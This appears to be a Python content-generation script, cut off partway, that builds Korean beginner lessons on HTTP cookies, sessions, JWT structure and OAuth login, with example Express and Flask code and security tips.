# -*- coding: utf-8 -*-
"""
네트워크 콘텐츠 생성 스크립트 - Part 3
05_인증, 06_CORS/보안 섹션 (11개 토픽)
"""

import json
import os

# 파일 경로
NETWORK_JSON_PATH = "src/data/contents/network.json"

# 05_인증 섹션 콘텐츠
AUTH_CONTENTS = {
    "05_인증/cookie": {
        "title": "쿠키",
        "description": "HTTP 쿠키의 개념과 활용법을 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🍪 쿠키란?",
                "content": """## 🍪 한 줄 요약
> **브라우저에 저장되는 작은 메모장** - 웹사이트가 나를 기억하게 해줘요!

---

## 💡 왜 필요한가?

### 문제 상황:
```
HTTP는 "기억력이 없다" (Stateless)

매 요청마다:
"안녕하세요, 저 홍길동이에요" (로그인)
"안녕하세요, 저 홍길동이에요" (장바구니)
"안녕하세요, 저 홍길동이에요" (결제)

→ 너무 불편해! 😩
```

### 쿠키로 해결:
```
🍪 쿠키 = 브라우저의 메모장

1. 로그인 → 서버: "이 쿠키 가지고 다녀" (쿠키 발급)
2. 장바구니 → 브라우저: 쿠키 자동 첨부
3. 결제 → 브라우저: 쿠키 자동 첨부

→ 자동으로 "나 홍길동이야" 전달!
```

---

## 🎯 쿠키의 구조

### 쿠키 예시:
```
Set-Cookie: user_id=12345; Max-Age=3600; Path=/; Secure; HttpOnly

├── user_id=12345  : 이름=값 (실제 데이터)
├── Max-Age=3600   : 1시간 후 삭제
├── Path=/         : 모든 경로에서 전송
├── Secure         : HTTPS에서만 전송
└── HttpOnly       : JavaScript 접근 불가
```

### 쿠키 종류:
```
📁 세션 쿠키 (Session Cookie)
├── 브라우저 닫으면 삭제
└── 임시 로그인에 사용

📁 영구 쿠키 (Persistent Cookie)
├── 만료일까지 유지
├── "자동 로그인", "7일간 보지 않기"
└── Max-Age 또는 Expires 설정

📁 서드파티 쿠키 (Third-party Cookie)
├── 다른 도메인에서 설정한 쿠키
├── 광고 추적에 사용
└── 점점 차단되는 추세
```"""
            },
            {
                "type": "code",
                "title": "💻 쿠키 다루기",
                "content": """### 서버에서 쿠키 설정 (Node.js/Express)

```javascript
// 쿠키 설정
app.get('/login', (req, res) => {
  res.cookie('user_id', '12345', {
    maxAge: 24 * 60 * 60 * 1000, // 1일
    httpOnly: true,  // JS 접근 차단
    secure: true,    // HTTPS만
    sameSite: 'Lax'  // CSRF 방지
  });
  res.send('로그인 성공!');
});

// 쿠키 읽기
app.get('/profile', (req, res) => {
  const userId = req.cookies.user_id;
  res.send(`사용자: ${userId}`);
});

// 쿠키 삭제
app.get('/logout', (req, res) => {
  res.clearCookie('user_id');
  res.send('로그아웃!');
});
```

### 브라우저에서 쿠키 (JavaScript)

```javascript
// 쿠키 읽기 (HttpOnly가 아닌 경우만)
console.log(document.cookie);
// "theme=dark; lang=ko"

// 쿠키 설정
document.cookie = "theme=dark; max-age=86400; path=/";

// 쿠키 삭제 (만료일을 과거로)
document.cookie = "theme=; max-age=0";

// 쿠키 파싱 유틸
function getCookie(name) {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) return value;
  }
  return null;
}
```

### Python Flask

```python
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/login')
def login():
    resp = make_response('로그인 성공!')
    resp.set_cookie('user_id', '12345',
                    max_age=86400,  # 1일
                    httponly=True,
                    secure=True)
    return resp

@app.route('/profile')
def profile():
    user_id = request.cookies.get('user_id')
    return f'사용자: {user_id}'
```"""
            },
            {
                "type": "tip",
                "title": "💡 쿠키 보안 설정",
                "content": """### 필수 보안 옵션

```
✅ HttpOnly
├── document.cookie로 접근 불가
└── XSS 공격 방지

✅ Secure
├── HTTPS에서만 전송
└── 네트워크 도청 방지

✅ SameSite
├── Strict: 같은 사이트에서만
├── Lax: 링크 클릭은 허용 (기본값)
└── None: 모두 허용 (Secure 필수)
└── CSRF 공격 방지
```

### 쿠키 크기 제한

```
📏 제한 사항:
├── 쿠키 1개: 최대 4KB
├── 도메인당: 약 20~50개
└── 총 용량: 도메인당 4KB 권장

💡 큰 데이터는?
└── 쿠키 대신 localStorage 또는
    서버 세션 사용!
```

### 개발자 도구로 확인

```
Chrome → F12 → Application 탭 → Cookies

확인 가능:
├── 쿠키 이름/값
├── 만료일
├── 크기
├── HttpOnly, Secure 여부
└── 직접 수정/삭제 가능
```"""
            }
        ]
    },

    "05_인증/session": {
        "title": "세션",
        "description": "세션의 개념과 서버 측 상태 관리를 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🎫 세션이란?",
                "content": """## 🎫 한 줄 요약
> **서버의 손님 명부** - 누가 로그인했는지 서버가 기억해요!

---

## 💡 비유로 이해하기

### 놀이공원 자유이용권:
```
🎢 놀이공원 (서버)
├── 입장 시 팔찌 발급 (세션 ID)
├── 놀이기구마다 팔찌 확인
├── 명부에서 "이 팔찌 = VIP" 확인
└── 퇴장 시 팔찌 회수 (세션 삭제)

🌐 웹 서비스도 똑같아요!
├── 로그인 시 세션 ID 발급
├── 요청마다 세션 ID 확인
├── 서버에서 "이 ID = 홍길동" 확인
└── 로그아웃 시 세션 삭제
```

---

## 🎯 세션 동작 방식

### 1. 로그인 과정
```
클라이언트                    서버
    │                         │
    │ ── POST /login ───────► │
    │    (id, password)       │
    │                         │ 1. 비밀번호 확인 ✓
    │                         │ 2. 세션 생성
    │                         │    session_id: "abc123"
    │                         │    data: {user_id: 1, name: "홍길동"}
    │                         │ 3. 세션 저장소에 저장
    │ ◄─ Set-Cookie ───────── │
    │    session_id=abc123    │
```

### 2. 이후 요청
```
클라이언트                    서버
    │                         │
    │ ── GET /profile ──────► │
    │    Cookie: session_id   │
    │      =abc123            │
    │                         │ 1. 세션 ID로 조회
    │                         │ 2. {user_id: 1} 확인
    │                         │ 3. 홍길동의 프로필 반환
    │ ◄─ 프로필 데이터 ────── │
```

### 세션 저장소
```
📦 저장 위치 옵션:

1. 메모리 (기본)
   ├── 빠름
   └── 서버 재시작 시 삭제

2. 데이터베이스
   ├── 영구 저장
   └── 다소 느림

3. Redis (추천)
   ├── 빠름 + 영구 저장
   ├── 여러 서버 공유 가능
   └── 만료 시간 자동 관리
```"""
            },
            {
                "type": "code",
                "title": "💻 세션 구현하기",
                "content": """### Express + express-session

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

// 세션 설정
app.use(session({
  secret: 'my-secret-key',  // 서명용 비밀키
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 24 * 60 * 60 * 1000, // 1일
    httpOnly: true,
    secure: true  // HTTPS
  }
}));

// 로그인
app.post('/login', (req, res) => {
  const { userId, password } = req.body;

  // 비밀번호 확인 후...
  req.session.userId = userId;
  req.session.isLoggedIn = true;

  res.json({ message: '로그인 성공!' });
});

// 인증 확인
app.get('/profile', (req, res) => {
  if (!req.session.isLoggedIn) {
    return res.status(401).json({ error: '로그인 필요' });
  }

  res.json({ userId: req.session.userId });
});

// 로그아웃
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.json({ message: '로그아웃!' });
});
```

### Python Flask-Session

```python
from flask import Flask, session
from flask_session import Session

app = Flask(__name__)
app.config['SECRET_KEY'] = 'my-secret-key'
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

@app.route('/login', methods=['POST'])
def login():
    # 로그인 검증 후...
    session['user_id'] = user_id
    session['logged_in'] = True
    return {'message': '로그인 성공!'}

@app.route('/profile')
def profile():
    if not session.get('logged_in'):
        return {'error': '로그인 필요'}, 401
    return {'user_id': session['user_id']}

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return {'message': '로그아웃!'}
```

### Redis 세션 저장소 (Node.js)

```javascript
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient();
await redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'my-secret',
  resave: false,
  saveUninitialized: false
}));
```"""
            },
            {
                "type": "tip",
                "title": "💡 세션 관리 팁",
                "content": """### 세션 보안

```
🔒 필수 설정:
├── secret: 충분히 긴 랜덤 문자열
├── cookie.httpOnly: true
├── cookie.secure: true (HTTPS)
└── cookie.sameSite: 'strict' 또는 'lax'

⏰ 만료 관리:
├── 적절한 maxAge 설정
├── 활동 시 갱신 (sliding session)
└── 중요 작업 시 재인증 요청
```

### 다중 서버 환경

```
문제:
서버 A에서 로그인 → 세션 생성
서버 B로 요청 → 세션 없음! 😱

해결:
┌─────────┐
│ Redis   │ ← 세션 공유 저장소
└────┬────┘
     │
   ┌─┴─┐
   │   │
서버A 서버B ← 같은 Redis 사용
```

### 세션 vs 토큰 선택

```
📊 세션 적합:
├── 단일 서버
├── 웹 브라우저 중심
├── 즉시 무효화 필요
└── 보안 중요

📊 토큰(JWT) 적합:
├── 다중 서버/마이크로서비스
├── 모바일 앱
├── API 중심
└── Stateless 필요
```"""
            }
        ]
    },

    "05_인증/cookie-vs-session": {
        "title": "쿠키 vs 세션",
        "description": "쿠키와 세션의 차이점을 비교합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🍪🎫 쿠키 vs 세션",
                "content": """## 🍪🎫 한 줄 요약
> **쿠키는 브라우저 메모, 세션은 서버 명부** - 둘 다 "기억"하지만 장소가 달라요!

---

## 💡 핵심 차이

### 저장 위치
```
🍪 쿠키
├── 브라우저(클라이언트)에 저장
├── 사용자가 볼 수 있음
└── 수정/삭제 가능

🎫 세션
├── 서버에 저장
├── 사용자는 ID만 가짐
└── 직접 수정 불가
```

### 비유로 이해하기
```
🍪 쿠키 = 신분증을 직접 들고 다님
├── 내 정보가 카드에 적혀있음
├── 분실하면 정보 노출 위험
└── 빠르게 확인 가능

🎫 세션 = 번호표만 들고 다님
├── 번호로 서버에서 조회
├── 분실해도 번호만 노출
└── 서버 조회 필요
```

---

## 🎯 상세 비교

| 구분 | 쿠키 | 세션 |
|-----|------|------|
| 저장 위치 | 브라우저 | 서버 |
| 보안 | 낮음 (노출 위험) | 높음 (서버 보관) |
| 용량 | 4KB 제한 | 제한 없음 |
| 속도 | 빠름 | 서버 조회 필요 |
| 만료 | 설정된 기간 | 서버 설정 따름 |
| 서버 부하 | 없음 | 저장소 필요 |

### 실제 사용 예시
```
🍪 쿠키만 사용:
├── "오늘 하루 보지 않기"
├── 다크모드 설정
├── 언어 설정
└── 장바구니 (비회원)

🎫 세션 사용:
├── 로그인 상태 유지
├── 결제 정보
├── 개인 정보
└── 민감한 데이터

🍪 + 🎫 함께 사용 (일반적):
├── 쿠키: 세션 ID 저장
└── 세션: 실제 사용자 데이터
```"""
            },
            {
                "type": "code",
                "title": "💻 비교 코드",
                "content": """### 쿠키만 사용 (민감하지 않은 데이터)

```javascript
// 테마 설정 - 쿠키로 충분
app.get('/set-theme', (req, res) => {
  res.cookie('theme', 'dark', {
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1년
    httpOnly: false  // JS에서 읽어야 함
  });
  res.send('테마 저장!');
});

// 클라이언트에서 테마 적용
const theme = document.cookie
  .split(';')
  .find(c => c.includes('theme'))
  ?.split('=')[1] || 'light';

document.body.className = theme;
```

### 세션 사용 (민감한 데이터)

```javascript
// 로그인 - 세션 사용
app.post('/login', (req, res) => {
  // 비밀번호 확인 후...
  req.session.user = {
    id: user.id,
    name: user.name,
    email: user.email,
    role: user.role
  };
  res.json({ message: '로그인 성공' });
});

// 쿠키엔 세션 ID만!
// Set-Cookie: connect.sid=s%3Axyz123...
```

### 쿠키 + 세션 조합

```javascript
// 1. 로그인 시: 세션 생성 + 쿠키로 ID 전달
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);

  // 세션에 사용자 정보 저장 (서버)
  req.session.userId = user.id;
  req.session.role = user.role;

  // "자동 로그인" 체크 시: 영구 쿠키 추가
  if (req.body.rememberMe) {
    res.cookie('remember_token', generateToken(), {
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30일
      httpOnly: true,
      secure: true
    });
  }

  res.json({ success: true });
});

// 2. 세션 만료 시: remember_token으로 자동 로그인
app.use(async (req, res, next) => {
  if (!req.session.userId && req.cookies.remember_token) {
    const user = await findByToken(req.cookies.remember_token);
    if (user) {
      req.session.userId = user.id;
    }
  }
  next();
});
```"""
            },
            {
                "type": "tip",
                "title": "💡 선택 가이드",
                "content": """### 언제 뭘 쓸까?

```
✅ 쿠키만 사용:
├── 사용자 설정 (테마, 언어)
├── 비회원 장바구니
├── 팝업 "오늘 하루 보지 않기"
├── 간단한 상태 저장
└── 노출되어도 상관없는 데이터

✅ 세션 필수:
├── 로그인 상태
├── 결제/금융 정보
├── 개인정보
├── 권한 정보
└── 민감한 모든 데이터
```

### 보안 체크리스트

```
🍪 쿠키 보안:
□ HttpOnly 설정
□ Secure 설정 (HTTPS)
□ SameSite 설정
□ 민감 정보 저장 금지
□ 적절한 만료 시간

🎫 세션 보안:
□ 강력한 secret 키
□ HTTPS 사용
□ 세션 ID 재생성 (로그인 후)
□ 적절한 타임아웃
□ 안전한 저장소 (Redis 등)
```

### 흔한 실수

```
❌ 쿠키에 비밀번호 저장
❌ 쿠키에 개인정보 저장
❌ HttpOnly 없이 인증 쿠키
❌ 세션 ID 예측 가능
❌ 로그아웃 시 세션 미삭제

✅ 올바른 방법:
├── 민감 정보는 세션에
├── 쿠키엔 ID만 저장
└── 보안 옵션 필수 설정
```"""
            }
        ]
    },

    "05_인증/jwt": {
        "title": "JWT",
        "description": "JSON Web Token의 개념과 인증 방식을 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🎟️ JWT란?",
                "content": """## 🎟️ 한 줄 요약
> **디지털 신분증** - 서버 확인 없이 본인 증명이 가능해요!

---

## 💡 왜 JWT가 필요한가?

### 세션의 문제:
```
세션 방식:
서버 A → 세션 저장
서버 B → 세션 없음! 😱

해결책 1: Redis 공유 세션
└── 매번 Redis 조회 필요

해결책 2: JWT ⭐
└── 토큰 자체에 정보 포함
└── 서버 조회 불필요!
```

### JWT 비유:
```
🎫 세션 = 영화관 예매 번호
├── 번호만 들고 다님
├── 좌석 확인? → 시스템 조회 필요
└── 서버 의존적

🎟️ JWT = 콘서트 티켓
├── 티켓에 좌석, 날짜 다 적혀있음
├── 티켓만 보면 정보 확인 가능
├── 위조 방지 홀로그램 (서명)
└── 서버 독립적
```

---

## 🎯 JWT 구조

### 세 부분으로 구성:
```
xxxxx.yyyyy.zzzzz
  │      │     │
  │      │     └── Signature (서명)
  │      └── Payload (데이터)
  └── Header (헤더)
```

### 실제 예시:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOjEsIm5hbWUiOiLtmY3quLjrj5kiLCJleHAiOjE3MzU2ODk2MDB9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

해석:
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"userId": 1, "name": "홍길동", "exp": 1735689600}
Signature: 위조 방지 서명
```

### 중요한 특징:
```
⚠️ 암호화 ❌ → 인코딩 ⭕

누구나 디코딩 가능!
├── jwt.io 에서 붙여넣기만 해도 내용 보임
├── 민감 정보 넣으면 안 됨!
└── 비밀번호 절대 금지!

서명만 검증:
├── 내용이 변조되었는지
└── 우리 서버가 발급했는지
```"""
            },
            {
                "type": "code",
                "title": "💻 JWT 사용하기",
                "content": """### Node.js (jsonwebtoken)

```javascript
const jwt = require('jsonwebtoken');

const SECRET = 'my-super-secret-key-12345';

// 토큰 생성
function createToken(user) {
  return jwt.sign(
    { userId: user.id, name: user.name },  // payload
    SECRET,
    { expiresIn: '1h' }  // 1시간 후 만료
  );
}

// 토큰 검증
function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, SECRET);
    return { valid: true, data: decoded };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

// 로그인 API
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  const token = createToken(user);

  res.json({ token });
});

// 인증 미들웨어
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    return res.status(401).json({ error: '토큰 없음' });
  }

  const token = authHeader.split(' ')[1]; // "Bearer xxx"
  const result = verifyToken(token);

  if (!result.valid) {
    return res.status(401).json({ error: '유효하지 않은 토큰' });
  }

  req.user = result.data;
  next();
}

// 보호된 API
app.get('/profile', authMiddleware, (req, res) => {
  res.json({ user: req.user });
});
```

### Python (PyJWT)

```python
import jwt
from datetime import datetime, timedelta

SECRET = 'my-super-secret-key-12345'

# 토큰 생성
def create_token(user_id, name):
    payload = {
        'user_id': user_id,
        'name': name,
        'exp': datetime.utcnow() + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

# 토큰 검증
def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        return None  # 만료됨
    except jwt.InvalidTokenError:
        return None  # 유효하지 않음

# Flask 예시
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.json)
    token = create_token(user.id, user.name)
    return {'token': token}

@app.route('/profile')
def profile():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return {'error': '토큰 없음'}, 401

    token = auth_header.split(' ')[1]
    payload = verify_token(token)

    if not payload:
        return {'error': '유효하지 않은 토큰'}, 401

    return {'user': payload}
```"""
            },
            {
                "type": "tip",
                "title": "💡 JWT 실전 팁",
                "content": """### Access Token + Refresh Token

```
문제: 토큰 탈취 시 만료까지 악용 가능

해결: 토큰 2개 사용

🔑 Access Token
├── 짧은 만료 (15분~1시간)
├── API 요청에 사용
└── 탈취되어도 금방 만료

🔄 Refresh Token
├── 긴 만료 (7일~30일)
├── Access Token 재발급용
├── 안전하게 저장 (HttpOnly 쿠키)
└── 탈취 시 강제 만료 가능
```

### 토큰 저장 위치

```
📱 모바일 앱:
└── Secure Storage (Keychain/Keystore)

🌐 웹 브라우저:
├── Access: 메모리 (변수)
├── Refresh: HttpOnly 쿠키
└── localStorage는 XSS 위험!

⚠️ 금지:
├── localStorage (XSS 취약)
├── 일반 쿠키 (XSS 취약)
└── URL 파라미터 (노출)
```

### JWT vs 세션 선택

```
✅ JWT 적합:
├── 마이크로서비스
├── 여러 도메인/앱
├── 모바일 앱
├── Stateless API
└── 확장성 중요

✅ 세션 적합:
├── 단일 서버
├── 웹 브라우저 only
├── 즉시 로그아웃 필요
├── 짧은 세션
└── 단순한 구조
```

### 흔한 실수

```
❌ 민감 정보를 payload에
❌ 너무 긴 만료 시간
❌ SECRET이 약하거나 노출
❌ localStorage에 저장
❌ 만료된 토큰 처리 안 함

✅ 올바른 방법:
├── payload에 최소 정보만
├── 적절한 만료 시간
├── 강력한 SECRET (환경변수)
├── HttpOnly 쿠키 사용
└── 만료 시 재발급 로직
```"""
            }
        ]
    },

    "05_인증/jwt-structure": {
        "title": "JWT 구조",
        "description": "JWT의 Header, Payload, Signature를 상세히 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "📋 JWT 구조 분석",
                "content": """## 📋 한 줄 요약
> **Header.Payload.Signature** - 세 부분이 점(.)으로 연결되어 있어요!

---

## 🎯 세 부분 상세 분석

### 1. Header (헤더)
```json
{
  "alg": "HS256",   // 서명 알고리즘
  "typ": "JWT"      // 토큰 타입
}

↓ Base64 인코딩
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

### 2. Payload (내용)
```json
{
  // 등록된 클레임 (표준)
  "iss": "myapp.com",     // 발급자
  "sub": "user123",       // 주제 (보통 user id)
  "exp": 1735689600,      // 만료 시간
  "iat": 1735686000,      // 발급 시간

  // 공개 클레임 (커스텀)
  "name": "홍길동",
  "role": "admin"
}

↓ Base64 인코딩
eyJ1c2VySWQiOjEsIm5hbWUiOiLtmY3quLjrj5kiLCJyb2xlIjoiYWRtaW4ifQ
```

### 3. Signature (서명)
```
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret_key
)

↓ 결과
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

---

## 🔒 서명이 중요한 이유

```
🚨 해커가 payload 변조 시도:

원본: {"role": "user"}
변조: {"role": "admin"}

서버 검증:
1. header + payload로 서명 재계산
2. 토큰의 서명과 비교
3. 불일치! → 변조됨! → 거부 ❌

→ 서명이 있어서 변조 불가능!
```"""
            },
            {
                "type": "code",
                "title": "💻 JWT 디코딩/생성",
                "content": """### JWT 수동 디코딩

```javascript
// JWT 디코딩 (검증 없이 내용만 보기)
function decodeJWT(token) {
  const parts = token.split('.');

  const header = JSON.parse(
    Buffer.from(parts[0], 'base64').toString()
  );

  const payload = JSON.parse(
    Buffer.from(parts[1], 'base64').toString()
  );

  return { header, payload };
}

// 사용
const token = 'eyJhbGc...';
const { header, payload } = decodeJWT(token);

console.log(header);
// { alg: 'HS256', typ: 'JWT' }

console.log(payload);
// { userId: 1, name: '홍길동', exp: 1735689600 }
```

### 클레임 종류

```javascript
const jwt = require('jsonwebtoken');

// 다양한 클레임 사용
const token = jwt.sign({
  // 등록된 클레임 (Registered Claims)
  iss: 'myapp.com',      // issuer: 발급자
  sub: 'user_123',       // subject: 대상
  aud: 'myapp-client',   // audience: 대상자
  exp: Math.floor(Date.now() / 1000) + 3600, // 만료
  nbf: Math.floor(Date.now() / 1000), // not before
  iat: Math.floor(Date.now() / 1000), // issued at
  jti: 'unique-token-id', // JWT ID

  // 비공개 클레임 (Private Claims) - 커스텀
  userId: 1,
  role: 'admin',
  permissions: ['read', 'write']

}, SECRET);
```

### 서명 알고리즘 비교

```javascript
// HS256 (대칭키) - 같은 키로 서명/검증
const tokenHS = jwt.sign(payload, 'shared-secret', {
  algorithm: 'HS256'
});

// RS256 (비대칭키) - 다른 키로 서명/검증
const privateKey = fs.readFileSync('private.key');
const publicKey = fs.readFileSync('public.key');

const tokenRS = jwt.sign(payload, privateKey, {
  algorithm: 'RS256'
});

// 검증은 public key로
jwt.verify(tokenRS, publicKey);
```

### Python에서 디코딩

```python
import base64
import json

def decode_jwt(token):
    parts = token.split('.')

    # Base64 URL 디코딩
    def decode_part(part):
        # padding 추가
        padding = 4 - len(part) % 4
        part += '=' * padding
        return json.loads(base64.urlsafe_b64decode(part))

    header = decode_part(parts[0])
    payload = decode_part(parts[1])

    return header, payload

# 사용
header, payload = decode_jwt(token)
print(f"만료: {payload['exp']}")
```"""
            },
            {
                "type": "tip",
                "title": "💡 JWT 구조 활용",
                "content": """### 알고리즘 선택

```
HS256 (HMAC + SHA256)
├── 대칭키: 같은 키로 서명/검증
├── 간단하고 빠름
├── 서버 간 키 공유 필요
└── 단일 서비스에 적합

RS256 (RSA + SHA256)
├── 비대칭키: private으로 서명, public으로 검증
├── 더 복잡하지만 안전
├── public key 공개 가능
└── 마이크로서비스에 적합

권장:
├── 단일 서버: HS256
└── 여러 서비스: RS256
```

### Payload 설계

```
✅ 포함할 것:
├── 사용자 ID (sub)
├── 권한/역할
├── 만료 시간 (exp)
└── 발급 시간 (iat)

❌ 포함하면 안 되는 것:
├── 비밀번호
├── 신용카드 정보
├── 주민번호
└── 민감한 개인정보

이유:
└── JWT는 암호화가 아니라
    누구나 디코딩 가능!
```

### jwt.io 활용

```
https://jwt.io

1. 토큰 붙여넣기 → 자동 디코딩
2. 만료 시간 확인
3. 서명 검증 (secret 입력)
4. 디버깅에 매우 유용!

⚠️ 주의:
├── 실제 서비스 토큰
└── 공개 사이트에 붙여넣지 말 것!
```

### 만료 처리

```javascript
// 만료 확인
function isExpired(token) {
  const payload = decodeJWT(token).payload;
  const now = Math.floor(Date.now() / 1000);
  return payload.exp < now;
}

// 만료 임박 확인 (5분 전)
function needsRefresh(token) {
  const payload = decodeJWT(token).payload;
  const now = Math.floor(Date.now() / 1000);
  return payload.exp - now < 300; // 5분
}
```"""
            }
        ]
    },

    "05_인증/oauth": {
        "title": "OAuth",
        "description": "OAuth 2.0 인증 프레임워크를 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🔐 OAuth란?",
                "content": """## 🔐 한 줄 요약
> **대리 인증** - 비밀번호 없이 카카오/구글이 대신 로그인해줘요!

---

## 💡 왜 OAuth가 필요한가?

### 문제 상황:
```
앱: "카카오 친구 목록 보여주세요"
사용자: "네, 카카오 비밀번호는..."

⚠️ 위험!
├── 앱이 비밀번호를 알게 됨
├── 앱이 해킹되면? 비번 유출!
└── 앱이 다른 것도 할 수 있음
```

### OAuth로 해결:
```
앱: "카카오 로그인하세요"
사용자: (카카오에서 직접 로그인)
카카오: "이 앱에 친구 목록만 줄까요?"
사용자: "네!"
카카오: "여기 친구 목록 접근 토큰이요"

✅ 안전!
├── 앱은 비밀번호 모름
├── 허락한 것만 접근 가능
└── 언제든 권한 취소 가능
```

---

## 🎯 OAuth 등장인물

```
👤 Resource Owner (사용자)
└── 카카오 계정 주인

📱 Client (우리 앱)
└── 카카오 로그인 붙인 앱

🏢 Authorization Server (인증 서버)
└── 카카오 로그인 페이지

📦 Resource Server (리소스 서버)
└── 카카오 API (친구 목록 등)
```

### OAuth 흐름 (Authorization Code)

```
┌─────────┐                          ┌─────────┐
│  사용자  │                          │  카카오  │
└────┬────┘                          └────┬────┘
     │                                    │
     │ 1. "카카오로 로그인" 클릭            │
     │────────────────────────────────►   │
     │                                    │
     │ 2. 카카오 로그인 페이지              │
     │◄────────────────────────────────   │
     │                                    │
     │ 3. 로그인 + 권한 동의               │
     │────────────────────────────────►   │
     │                                    │
     │ 4. code 발급 (redirect)            │
     │◄────────────────────────────────   │
     │                                    │
     ▼                                    │
┌─────────┐                               │
│  우리앱  │                               │
└────┬────┘                               │
     │ 5. code로 token 요청               │
     │────────────────────────────────►   │
     │                                    │
     │ 6. access_token 발급               │
     │◄────────────────────────────────   │
     │                                    │
     │ 7. 토큰으로 API 호출                │
     │────────────────────────────────►   │
```"""
            },
            {
                "type": "code",
                "title": "💻 OAuth 구현하기",
                "content": """### 카카오 로그인 (Node.js)

```javascript
const axios = require('axios');

// 환경변수
const KAKAO_CLIENT_ID = process.env.KAKAO_CLIENT_ID;
const KAKAO_CLIENT_SECRET = process.env.KAKAO_CLIENT_SECRET;
const REDIRECT_URI = 'http://localhost:3000/auth/kakao/callback';

// 1. 카카오 로그인 페이지로 이동
app.get('/auth/kakao', (req, res) => {
  const kakaoAuthUrl = `https://kauth.kakao.com/oauth/authorize?` +
    `client_id=${KAKAO_CLIENT_ID}` +
    `&redirect_uri=${REDIRECT_URI}` +
    `&response_type=code`;

  res.redirect(kakaoAuthUrl);
});

// 2. 콜백: code → token 교환
app.get('/auth/kakao/callback', async (req, res) => {
  const { code } = req.query;

  // code로 access_token 요청
  const tokenResponse = await axios.post(
    'https://kauth.kakao.com/oauth/token',
    null,
    {
      params: {
        grant_type: 'authorization_code',
        client_id: KAKAO_CLIENT_ID,
        client_secret: KAKAO_CLIENT_SECRET,
        redirect_uri: REDIRECT_URI,
        code: code
      }
    }
  );

  const { access_token } = tokenResponse.data;

  // 3. 사용자 정보 가져오기
  const userResponse = await axios.get(
    'https://kapi.kakao.com/v2/user/me',
    {
      headers: { Authorization: `Bearer ${access_token}` }
    }
  );

  const kakaoUser = userResponse.data;

  // 4. 우리 서비스 로그인 처리
  let user = await User.findOne({ kakaoId: kakaoUser.id });
  if (!user) {
    user = await User.create({
      kakaoId: kakaoUser.id,
      nickname: kakaoUser.properties.nickname
    });
  }

  // 세션 또는 JWT 발급
  req.session.userId = user.id;
  res.redirect('/');
});
```

### Google OAuth (Passport.js)

```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    // 사용자 찾기 또는 생성
    let user = await User.findOne({ googleId: profile.id });
    if (!user) {
      user = await User.create({
        googleId: profile.id,
        email: profile.emails[0].value,
        name: profile.displayName
      });
    }
    done(null, user);
  }
));

// 라우트
app.get('/auth/google', passport.authenticate('google', {
  scope: ['profile', 'email']
}));

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/')
);
```"""
            },
            {
                "type": "tip",
                "title": "💡 OAuth 실전 팁",
                "content": """### Grant Types (인증 방식)

```
📱 Authorization Code (추천)
├── 서버가 있는 앱용
├── 가장 안전
└── 카카오/구글 로그인

📱 PKCE (모바일/SPA용)
├── Authorization Code + 보안 강화
├── 서버 없어도 안전
└── 모바일 앱 권장

🔑 Client Credentials
├── 서버 to 서버
├── 사용자 없음
└── API 키 방식

❌ Implicit (폐기 예정)
└── 보안 취약, 사용 금지
```

### Scope (권한 범위)

```
카카오 예시:
├── profile_nickname: 닉네임
├── profile_image: 프로필 사진
├── account_email: 이메일
└── friends: 친구 목록

필요한 것만 요청!
├── 과도한 권한 요청 → 사용자 거부
└── 최소 권한 원칙
```

### 토큰 관리

```
Access Token:
├── 짧은 수명 (1시간)
├── API 호출용
└── 노출 시 빠른 만료

Refresh Token:
├── 긴 수명 (수개월)
├── Access Token 재발급
├── 안전하게 서버 보관
└── 탈취 시 피해 큼

⚠️ 주의사항:
├── Refresh Token은 서버에만!
├── 클라이언트 저장 금지
└── 탈취 시 즉시 폐기
```

### 보안 체크리스트

```
□ state 파라미터 사용 (CSRF 방지)
□ HTTPS 필수
□ 토큰 안전하게 저장
□ 최소 권한 scope만 요청
□ 에러 메시지 최소화
□ redirect_uri 화이트리스트
```"""
            }
        ]
    },

    "05_인증/auth-compare": {
        "title": "인증 방식 비교",
        "description": "다양한 인증 방식을 비교 분석합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🔐 인증 방식 총정리",
                "content": """## 🔐 한 줄 요약
